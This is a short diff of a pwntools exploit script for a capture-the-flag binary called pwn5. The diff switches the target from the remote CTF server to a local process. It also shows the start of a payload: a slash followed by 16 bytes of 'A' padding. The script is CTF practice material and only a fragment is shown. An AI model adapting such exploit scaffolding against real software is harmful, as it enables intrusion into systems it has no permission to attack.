@@ -2,8 +2,8 @@ from pwn import *
 
 def exploit():
     binary = ELF("./pwn5")
-    #p = process("./pwn5")
-    p = remote("pwn.tamuctf.com", 4325)
+    p = process("./pwn5")
+    #p = remote("pwn.tamuctf.com", 4325)
     padding = 16
     payload = "/"
     payload += "A" * padding
